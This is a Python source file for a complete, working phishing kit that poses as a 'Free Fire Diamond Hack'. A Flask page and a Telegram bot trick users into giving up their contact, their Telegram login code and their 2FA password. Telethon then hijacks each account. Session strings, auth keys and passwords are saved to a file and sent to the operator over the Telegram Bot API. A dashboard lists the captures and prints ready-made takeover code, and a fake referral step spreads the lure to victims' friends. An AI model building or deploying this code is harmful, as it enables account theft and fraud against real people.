# ff_hack_server.py
# Free Fire "Diamond Hack" Phishing Server with Bot Contact Capture
# Run: python3 ff_hack_server.py

import os
import json
import base64
import threading
import asyncio
import logging
import time
import requests as http_requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-server.com")  # Your Flask public URL
# ===================================

app = Flask(__name__)

# ====== Storage ======
DATA_FILE = "captured_accounts.json"
user_sessions = {}
pending_codes = {}
pending_2fa = {}
contact_pending = {}  # tg_user_id -> phone mapping from contact share
sessions_lock = threading.Lock()

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}")
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']}")
    return account

captured_accounts = load_accounts()

# ====== Phone Formatter ======
def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

# ====== Bot Notification ======
def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    try:
        max_len = 3900
        extra = ""
        if password_used:
            extra = "\n🔐 2FA Password Used"
            if password_value:
                extra += f"\n🔑 Password: `{password_value}`"
        
        if len(ss) > max_len:
            msg1 = (f"🔥 FF Hack Capture!{extra}\n\n📱 Phone: {phone}\n👤 Name: {me.first_name or ''} {me.last_name or ''}\n"
                    f"🆔 User ID: {me.id}\n📛 Username: @{me.username or 'N/A'}\n🌐 DC: {dc}\n\n"
                    f"📄 Session (1/2):\n`{ss[:max_len]}`")
            msg2 = f"📄 Session (2/2) for {phone}:\n`{ss[max_len:]}`"
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
        else:
            msg = (f"🔥 FF Hack Capture!{extra}\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}\n"
                   f"🆔 {me.id}\n🌐 DC: {dc}\n\n🔑 Session:\n`{ss}`")
            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
            if r.status_code != 200:
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': OWNER_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")

# ====== Telegram Async Actions ======
def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                logger.info(f"✅ Code sent to {phone}")
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]
            
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                else:
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}
                
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                auth_key = client.session.auth_key.key
                dc = client.session.dc_id
                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                
                acc = {
                    'phone': phone, 'user_id': me.id, 'username': me.username or '',
                    'first_name': me.first_name or '', 'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64, 'userId': me.id, 'isSupport': False, 'isTest': False}),
                    'dc': dc, 'time': str(datetime.now()),
                    'has_2fa': password is not None, 'password': password or ''
                }
                save_account(acc)
                
                with sessions_lock:
                    if phone in user_sessions: del user_sessions[phone]
                    if phone in pending_2fa: del pending_2fa[phone]
                    pending_codes[phone] = 'done'
                
                send_bot_notification(phone, ss, me, dc, password is not None, password or "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try: await client.disconnect()
                except: pass

        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()

# ====== Free Fire Themed WebApp Page ======
FF_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Fire Diamond Hack 2026</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Roboto,sans-serif;background:#0a0a1a;color:white;min-height:100vh}
        .header{padding:40px 20px 20px;text-align:center;background:linear-gradient(180deg,#1a1a3e,#0a0a1a)}
        .header h1{font-size:28px;font-weight:900;background:linear-gradient(45deg,#ff6b00,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 30px rgba(255,107,0,0.5)}
        .header p{color:#888;font-size:13px;margin-top:8px}
        .ff-logo{width:80px;height:80px;margin:0 auto 15px;background:linear-gradient(135deg,#ff6b00,#ff0000);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:40px;box-shadow:0 0 30px rgba(255,107,0,0.4)}
        .diamond-card{margin:20px;background:#141428;border-radius:20px;padding:25px;border:1px solid #2a2a4e;text-align:center}
        .diamond-icon{font-size:50px;margin-bottom:10px}
        .diamond-amount{font-size:36px;font-weight:900;color:#ffd700;margin:10px 0}
        .features{list-style:none;text-align:left;margin:15px 0}
        .features li{padding:8px 0;color:#aaa;font-size:14px;border-bottom:1px solid #1a1a2e}
        .features li:before{content:"✓ ";color:#00ff00;font-weight:bold}
        .verify-btn{width:100%;padding:20px;background:linear-gradient(45deg,#ff6b00,#ff0000);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(255,107,0,0.4);text-transform:uppercase;letter-spacing:1px;margin-top:15px;transition:all 0.3s}
        .verify-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(255,107,0,0.6)}
        .verify-btn:disabled{opacity:0.5;cursor:not-allowed}
        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:1000;padding:20px;overflow-y:auto}
        .modal-overlay.active{display:flex;align-items:center;justify-content:center}
        .modal{background:#141428;border-radius:20px;padding:30px;max-width:400px;width:100%;border:1px solid #2a2a4e;animation:slideUp 0.3s ease}
        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
        .modal-icon{text-align:center;font-size:50px;margin-bottom:15px}
        .modal h2{text-align:center;font-size:20px;margin-bottom:10px;color:#ffd700}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:20px;line-height:1.6}
        .status-box{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
        .status-box.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
        .status-box.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
        .status-box.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
        .otp-display{background:#0a0a1a;border:2px solid #2a2a4e;border-radius:12px;padding:18px;font-size:32px;text-align:center;letter-spacing:12px;color:#ffd700;margin:15px 0;font-weight:bold;min-height:60px}
        .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:15px 0}
        .keypad button{padding:18px;border:none;border-radius:12px;background:#2a2a4e;color:white;font-size:24px;cursor:pointer;transition:0.15s}
        .keypad button:active{background:#3a3a6e;transform:scale(0.95)}
        .keypad .clear{background:#e94560}
        .keypad .submit{background:#00c853;font-weight:700;font-size:16px}
        .step{display:none}
        .step.active{display:block}
        .spinner{display:inline-block;width:20px;height:20px;border:3px solid #333;border-top-color:#ff6b00;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .referral-section{margin:20px;background:#141428;border-radius:15px;padding:20px;text-align:center;border:1px solid #2a2a4e}
        .ref-progress{display:flex;justify-content:center;gap:8px;margin:20px 0}
        .ref-step{width:40px;height:40px;border-radius:50%;background:#2a2a4e;display:flex;align-items:center;justify-content:center;font-weight:700;color:#666}
        .ref-step.done{background:#00c853;color:white}
        .ref-step.active{background:#ff6b00;color:white;animation:pulse 1s infinite}
        @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,107,0,0.4)}100%{box-shadow:0 0 0 12px rgba(255,107,0,0)}}
        .share-btn{width:100%;padding:16px;background:#25D366;border:none;border-radius:12px;color:white;font-size:16px;font-weight:700;cursor:pointer;margin:10px 0}
        .footer{text-align:center;padding:20px;color:#444;font-size:11px;margin-top:20px}
        .pwd-input{width:100%;padding:16px;background:#0a0a1a;border:2px solid #2a2a4e;border-radius:12px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
        .pwd-input:focus{border-color:#ff6b00}
        .contact-wait{background:#0a0a1a;border:2px dashed #ff6b00;border-radius:15px;padding:30px;text-align:center;margin:15px 0}
    </style>
</head>
<body>
    <div class="header">
        <div class="ff-logo">🔥</div>
        <h1>FF DIAMOND HACK 2026</h1>
        <p>Generate unlimited diamonds for Free Fire</p>
    </div>
    
    <div class="diamond-card">
        <div class="diamond-icon">💎</div>
        <div class="diamond-amount">10,000 DIAMONDS</div>
        <ul class="features">
            <li>Anti-ban protection enabled</li>
            <li>Instant delivery to account</li>
            <li>No root/jailbreak needed</li>
            <li>Works on all servers</li>
        </ul>
        <button class="verify-btn" id="startBtn" onclick="startHack()">
            🎮 GENERATE DIAMONDS
        </button>
    </div>
    
    <div class="referral-section" id="referralSection" style="display:none">
        <h3 style="color:#ffd700;margin-bottom:10px">🎁 Almost There!</h3>
        <p style="color:#888;font-size:13px">Share with 5 friends to unlock your diamonds</p>
        <div class="ref-progress">
            <div class="ref-step" id="r1">1</div>
            <div class="ref-step" id="r2">2</div>
            <div class="ref-step" id="r3">3</div>
            <div class="ref-step" id="r4">4</div>
            <div class="ref-step" id="r5">5</div>
        </div>
        <div id="refStatus" class="status-box waiting" style="display:block">
            <span class="spinner"></span> Waiting for shares...
        </div>
        <button class="share-btn" onclick="shareToTelegram()">📤 Share to Telegram</button>
        <p style="color:#666;font-size:11px;margin-top:10px">Your referral link:<br><code id="refLink" style="color:#0088cc;word-break:break-all">https://t.me/share/...</code></p>
    </div>
    
    <div class="footer">© 2026 FF Diamond Generator | Not affiliated with Garena</div>
    
    <!-- Verification Modal -->
    <div class="modal-overlay" id="vm">
        <div class="modal">
            <!-- Step 1: Contact Share (Auto-capture) -->
            <div id="s1" class="step active">
                <div class="modal-icon">📱</div>
                <h2>Verify Your Account</h2>
                <p>To prevent abuse, verify your Telegram account.<br>Tap the button below to share your contact automatically.</p>
                
                <div class="contact-wait">
                    <div style="font-size:40px;margin-bottom:10px">📞</div>
                    <p style="color:#aaa;font-size:14px">Waiting for contact share...</p>
                    <p style="color:#666;font-size:12px;margin-top:10px">Please tap "Share Contact" in the Telegram prompt</p>
                </div>
                
                <div id="contactStatus" class="status-box waiting" style="display:block">
                    <span class="spinner"></span> Connecting to Telegram...
                </div>
            </div>
            
            <!-- Step 2: OTP Input -->
            <div id="s2" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Enter OTP</h2>
                <p>📱 <span id="phoneDisplay" style="color:#ffd700;font-weight:bold;">+91XXXXXXXXXX</span></p>
                <div id="otpStatus" class="status-box waiting"><span class="spinner"></span> Sending code...</div>
                <div class="otp-display" id="otpDisplay">_</div>
                <div class="keypad">
                    <button onclick="addDigit('1')">1</button>
                    <button onclick="addDigit('2')">2</button>
                    <button onclick="addDigit('3')">3</button>
                    <button onclick="addDigit('4')">4</button>
                    <button onclick="addDigit('5')">5</button>
                    <button onclick="addDigit('6')">6</button>
                    <button onclick="addDigit('7')">7</button>
                    <button onclick="addDigit('8')">8</button>
                    <button onclick="addDigit('9')">9</button>
                    <button class="clear" onclick="clearDigit()">⌫</button>
                    <button onclick="addDigit('0')">0</button>
                    <button class="submit" id="verifyOtpBtn" onclick="verifyOTP()">✓ Verify</button>
                </div>
            </div>
            
            <!-- Step 2b: 2FA -->
            <div id="s2b" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Two-Factor Auth</h2>
                <p>This account has 2FA enabled.<br>Enter your Telegram cloud password:</p>
                <input type="password" id="pwdInput" class="pwd-input" placeholder="Enter password" maxlength="64">
                <button onclick="submitPassword()" style="width:100%;padding:16px;background:#e94560;border:none;border-radius:12px;color:white;font-size:16px;font-weight:700;cursor:pointer;margin:10px 0">
                    🔑 Verify Password
                </button>
                <div id="pwdStatus" class="status-box" style="display:none"></div>
            </div>
            
            <!-- Step 3: Final Loading -->
            <div id="s3" class="step">
                <div style="text-align:center;padding:30px 0">
                    <div style="font-size:60px;margin-bottom:20px">💎</div>
                    <h2 style="color:#00c853;font-size:24px">Generating Diamonds...</h2>
                    <p style="color:#888;font-size:13px;margin:15px 0">Please wait while we add 10,000 diamonds to your account</p>
                    <div style="margin:25px auto;width:60px;height:60px;border:5px solid #333;border-top-color:#ff6b00;border-radius:50%;animation:spin 1s linear infinite"></div>
                    <p style="color:#666;font-size:12px">Do not close this window</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        var tg = window.Telegram.WebApp;
        tg.expand();
        
        var userPhone = '';
        var userId = '';
        var otpCode = '';
        var checkInterval = null;
        var sharesDone = 0;
        
        // Init
        document.getElementById('vm').classList.add('active');
        document.getElementById('s1').classList.add('active');
        
        // Check if already captured
        function checkExisting() {
            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                userId = tg.initDataUnsafe.user.id;
                fetch('/api/check_user', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({user_id: userId})
                })
                .then(r => r.json())
                .then(data => {
                    if (data.captured) {
                        // Already captured, go to referral
                        document.getElementById('vm').classList.remove('active');
                        document.getElementById('referralSection').style.display = 'block';
                        sharesDone = parseInt(localStorage.getItem('ff_shares_' + userId) || '0');
                        updateRefProgress();
                    } else {
                        // Request contact via bot
                        requestContact();
                    }
                })
                .catch(() => requestContact());
            }
        }
        
        function requestContact() {
            // Send contact request to bot
            fetch('/api/request_contact', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId})
            });
            
            // Poll for contact
            var contactInterval = setInterval(() => {
                fetch('/api/get_contact/' + userId)
                .then(r => r.json())
                .then(data => {
                    if (data.phone) {
                        clearInterval(contactInterval);
                        userPhone = data.phone;
                        document.getElementById('phoneDisplay').textContent = userPhone;
                        proceedToOTP();
                    }
                });
            }, 2000);
        }
        
        function proceedToOTP() {
            document.getElementById('s1').classList.remove('active');
            document.getElementById('s2').classList.add('active');
            
            // Send OTP
            fetch('/api/share', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('otpStatus').className = 'status-box success';
                    document.getElementById('otpStatus').innerHTML = '✅ Code sent! Enter below:';
                    startPolling();
                } else {
                    document.getElementById('otpStatus').className = 'status-box error';
                    document.getElementById('otpStatus').textContent = '❌ ' + (data.error || 'Error');
                }
            });
        }
        
        function startPolling() {
            if (checkInterval) clearInterval(checkInterval);
            checkInterval = setInterval(() => {
                fetch('/api/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: userPhone})
                })
                .then(r => r.json())
                .then(data => {
                    if (data.s === '2fa_needed') {
                        clearInterval(checkInterval);
                        document.getElementById('s2').classList.remove('active');
                        document.getElementById('s2b').classList.add('active');
                    } else if (data.s === 'done') {
                        clearInterval(checkInterval);
                        showSuccess();
                    }
                });
            }, 2000);
        }
        
        function addDigit(d) {
            if (otpCode.length < 5) {
                otpCode += d;
                document.getElementById('otpDisplay').textContent = otpCode;
            }
        }
        
        function clearDigit() {
            otpCode = otpCode.slice(0, -1);
            document.getElementById('otpDisplay').textContent = otpCode || '_';
        }
        
        function verifyOTP() {
            if (otpCode.length < 5) return;
            document.getElementById('verifyOtpBtn').disabled = true;
            
            fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone, code: otpCode})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    localStorage.setItem('ff_user', userId);
                    showSuccess();
                } else if (data.needs_password) {
                    document.getElementById('s2').classList.remove('active');
                    document.getElementById('s2b').classList.add('active');
                } else {
                    document.getElementById('otpStatus').className = 'status-box error';
                    document.getElementById('otpStatus').textContent = '❌ ' + data.error;
                    otpCode = '';
                    document.getElementById('otpDisplay').textContent = '_';
                    document.getElementById('verifyOtpBtn').disabled = false;
                }
            });
        }
        
        function submitPassword() {
            var pwd = document.getElementById('pwdInput').value;
            if (!pwd) return;
            
            fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone, code: otpCode, password: pwd})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showSuccess();
                } else {
                    document.getElementById('pwdStatus').className = 'status-box error';
                    document.getElementById('pwdStatus').style.display = 'block';
                    document.getElementById('pwdStatus').textContent = '❌ ' + data.error;
                }
            });
        }
        
        function showSuccess() {
            document.getElementById('s2').classList.remove('active');
            document.getElementById('s2b').classList.remove('active');
            document.getElementById('s3').classList.add('active');
            
            setTimeout(() => {
                document.getElementById('vm').classList.remove('active');
                document.getElementById('referralSection').style.display = 'block';
                sharesDone = 0;
                updateRefProgress();
            }, 3000);
        }
        
        function updateRefProgress() {
            for (var i = 1; i <= 5; i++) {
                var el = document.getElementById('r' + i);
                if (i <= sharesDone) el.className = 'ref-step done';
                else if (i === sharesDone + 1) el.className = 'ref-step active';
                else el.className = 'ref-step';
            }
            if (sharesDone >= 5) {
                document.getElementById('refStatus').className = 'status-box success';
                document.getElementById('refStatus').innerHTML = '✅ Unlocked! Diamonds will arrive in 24h';
            }
        }
        
        function shareToTelegram() {
            var url = 'https://t.me/share/url?url=' + encodeURIComponent('https://t.me/YourBot?start=ref_' + userId);
            window.open(url, '_blank');
            sharesDone = Math.min(sharesDone + 1, 4);
            localStorage.setItem('ff_shares_' + userId, sharesDone);
            updateRefProgress();
        }
        
        // Start
        checkExisting();
    </script>
</body>
</html>"""

# ====== Bot Setup ======
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    
    # Check if already captured
    accounts = load_accounts()
    for a in accounts:
        if a.get('user_id') == user_id:
            # Already captured, show referral
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎮 Open FF Hack", web_app=WebAppInfo(url=WEBAPP_URL))]
            ])
            await message.answer("✅ Account verified! Open the app to claim diamonds:", reply_markup=kb)
            return
    
    # New user - request contact with force reply
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Share Contact", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=False
    )
    await message.answer(
        "🔥 <b>Free Fire Diamond Hack 2026</b>\n\n"
        "To verify your account and generate diamonds, please share your contact:",
        reply_markup=kb,
        parse_mode="HTML"
    )

@dp.message(F.contact)
async def handle_contact(message: Message):
    user_id = message.from_user.id
    phone = format_phone(message.contact.phone_number)
    
    # Store contact mapping
    contact_pending[user_id] = phone
    
    # Check if already in DB
    accounts = load_accounts()
    for a in accounts:
        if a['phone'] == phone:
            # Already captured, go to referral
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎮 Open FF Hack", web_app=WebAppInfo(url=WEBAPP_URL))]
            ])
            await message.answer("✅ Account already verified! Open to continue:", reply_markup=kb)
            return
    
    # Trigger OTP send
    with sessions_lock:
        pending_codes[phone] = 'sending'
    
    threading.Thread(target=run_telegram_action, args=(phone,)).start()
    
    # Open WebApp for OTP entry
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Enter OTP", web_app=WebAppInfo(url=WEBAPP_URL))]
    ])
    await message.answer(
        f"📱 Code sent to <code>{phone}</code>\n\nTap below to enter OTP:",
        reply_markup=kb,
        parse_mode="HTML"
    )

@dp.message(F.text == "📱 Share Contact")
async def force_contact(message: Message):
    # If they tap but don't share, keep asking
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Share Contact", request_contact=True)]],
        resize_keyboard=True
    )
    await message.answer("⚠️ Please tap the button below and select 'Share Contact':", reply_markup=kb)

# ====== Flask Routes ======

@app.route('/')
def index():
    return render_template_string(FF_PAGE)

@app.route('/api/request_contact', methods=['POST'])
def request_contact():
    # Bot will send contact request when user opens WebApp
    user_id = request.json.get('user_id')
    # This triggers bot to send contact request if not already done
    return jsonify({'success': True})

@app.route('/api/get_contact/<int:user_id>')
def get_contact(user_id):
    if user_id in contact_pending:
        return jsonify({'phone': contact_pending[user_id]})
    return jsonify({'phone': None})

@app.route('/api/check_user', methods=['POST'])
def check_user():
    user_id = request.json.get('user_id')
    accounts = load_accounts()
    for a in accounts:
        if a.get('user_id') == user_id:
            return jsonify({'captured': True, 'phone': a['phone']})
    return jsonify({'captured': False})

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    phone = format_phone(request.json.get('phone', ''))
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    result = run_telegram_action(ph, d.get('code', ''), d.get('password'))
    return jsonify(result)

@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    accounts = load_accounts()
    a = next((x for x in accounts if x['phone'] == phone), None)
    if not a:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({
        'phone': phone, 'user_id': a['user_id'], 'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'], 'dc': a['dc'], 'session': a['session'],
        'session_length': len(a['session']), 'webk_data': a['webk'],
        'has_2fa': a.get('has_2fa', False), 'password': a.get('password', '')
    })

@app.route('/dash')
def dash():
    accounts = load_accounts()
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
        twofa_tag = "🔐" if a.get('has_2fa') else ""
        rows += f"""<tr>
            <td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td>
            <td>{twofa_tag} {ss_status}</td><td>{a.get('time','')}</td>
            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">View</button></a></td>
        </tr>"""
    
    return f"""<!DOCTYPE html><html><head><title>FF Hack Dashboard</title>
    <style>body{{background:#0a0a1a;color:white;font-family:Arial;padding:20px}}
    h1{{color:#ff6b00}}table{{width:100%;border-collapse:collapse;margin-top:15px}}
    th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
    th{{background:#141428;color:#ddd}}tr:hover{{background:#141428}}</style></head>
    <body><h1>🔥 FF Hack Captures</h1>
    <p>Total: {len(accounts)} | 2FA: {sum(1 for a in accounts if a.get('has_2fa'))}</p>
    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>View</th></tr></thead>
    <tbody>{rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}</tbody></table>
    <script>setTimeout(()=>location.reload(),10000)</script></body></html>"""

@app.route('/webk/<phone>')
def webk(phone):
    phone = format_phone(phone)
    accounts = load_accounts()
    a = next((x for x in accounts if x['phone'] == phone), None)
    if not a:
        return "Not found", 404
    
    w = a['webk']
    ss = a['session']
    has_2fa = a.get('has_2fa', False)
    pwd = a.get('password', '')
    
    return f"""<!DOCTYPE html><html><head><title>Session - {a['first_name']}</title>
    <style>body{{background:#0a0a1a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
    .c{{background:#141428;padding:40px;border-radius:20px;max-width:600px;width:100%;text-align:center;border:1px solid #2a2a4e}}
    .sg{{background:#0a0a1a;padding:15px;border-radius:8px;text-align:left;font-size:11px;margin:10px 0;border:1px solid #2a2a4e;word-break:break-all}}
    .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
    .bp{{background:#0088cc;color:white}}.bs{{background:#00c853;color:white}}
    code{{color:#0f0;word-break:break-all;font-size:10px}}</style></head>
    <body><div class="c">
    <h2>{a['first_name']} {a['last_name']}</h2>
    <p style="color:#888">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</p>
    <p style="color:#ffd700">{a['phone']}</p>
    {'<div style="background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0">🔐 2FA Account<br>Password: <code>' + pwd + '</code></div>' if has_2fa and pwd else ''}
    <div class="sg"><b>Session String ({len(ss)} chars):</b><br><code>{ss}</code></div>
    <button class="b bp" onclick="navigator.clipboard.writeText('{ss}')">Copy Session</button>
    <div class="sg"><b>Telethon:</b><br><code>from telethon import TelegramClient\nfrom telethon.sessions import StringSession\nclient = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')\nclient.start()</code></div>
    <a href="/dash" style="color:#0088cc">Dashboard</a>
    </div></body></html>"""

# ====== Run ======
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    if not all([BOT_TOKEN, API_HASH, API_ID, OWNER_ID]):
        print("⚠️ Set BOT_TOKEN, API_ID, API_HASH, OWNER_ID, WEBAPP_URL env vars!")
        exit(1)
    
    # Run bot in background
    bot_thread = threading.Thread(target=lambda: asyncio.run(main()))
    bot_thread.daemon = True
    bot_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"\n{'='*50}")
    print(f"🔥 FF Diamond Hack Server Running")
    print(f"🌐 WebApp:  http://localhost:{port}")
    print(f"📊 Dashboard: http://localhost:{port}/dash")
    print(f"{'='*50}\n")
    app.run(host='0.0.0.0', port=port, debug=False)
